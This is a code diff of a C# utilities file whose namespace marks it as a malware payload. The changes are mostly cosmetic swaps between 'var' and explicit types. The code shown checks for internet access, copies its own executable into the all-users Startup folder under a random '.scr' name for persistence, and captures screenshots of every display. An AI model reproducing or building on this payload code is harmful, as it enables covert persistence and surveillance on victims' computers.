@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.IO.Compression;
@@ -20,9 +19,9 @@ namespace Umbral.payload.Utilities
         {
             try
             {
-                using (var httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(5.0) })
+                using (HttpClient httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(5.0) })
                 {
-                    var response = await httpClient.GetAsync("https://gstatic.com/generate_204");
+                    HttpResponseMessage response = await httpClient.GetAsync("https://gstatic.com/generate_204");
                     return response.StatusCode ==
                            HttpStatusCode.NoContent;
                 }
@@ -37,8 +36,8 @@ namespace Umbral.payload.Utilities
         {
             try
             {
-                var currentPath = Assembly.GetCallingAssembly().Location;
-                var directoryPath = Path.GetDirectoryName(currentPath);
+                string currentPath = Assembly.GetCallingAssembly().Location;
+                string directoryPath = Path.GetDirectoryName(currentPath);
                 string[] startupPath =
                 {
                     Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup),
@@ -56,11 +55,11 @@ namespace Umbral.payload.Utilities
 
         internal static string GenerateRandomString(int length)
         {
-            var random = new Random();
-            var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-            var result = new StringBuilder();
+            Random random = new Random();
+            string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+            StringBuilder result = new StringBuilder();
 
-            for (var i = 0; i < length; i++)
+            for (int i = 0; i < length; i++)
                 result.Append(chars[random.Next(0, chars.Length)]);
 
             return result.ToString();
@@ -68,9 +67,9 @@ namespace Umbral.payload.Utilities
 
         internal static bool PutInStartup()
         {
-            var currentPath = Assembly.GetExecutingAssembly().Location;
-            var startupDir = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
-            var newFilePath = Path.Combine(startupDir, $"{GenerateRandomString(5)}.scr");
+            string currentPath = Assembly.GetExecutingAssembly().Location;
+            string startupDir = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
+            string newFilePath = Path.Combine(startupDir, $"{GenerateRandomString(5)}.scr");
 
             try
             {
@@ -102,8 +101,8 @@ namespace Umbral.payload.Utilities
 
         internal static Bitmap[] CaptureScreenShot()
         {
-            List<Bitmap> results = new List<Bitmap>();
-            Screen[] allScreens = Screen.AllScreens;
+            var results = new List<Bitmap>();
+            var allScreens = Screen.AllScreens;
 
             foreach (Screen screen in allScreens)
             {
@@ -116,6 +115,7 @@ namespace Umbral.payload.Utilities
                         {
                             graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
                         }
+
                         results.Add((Bitmap)bitmap.Clone());
                     }
                 }
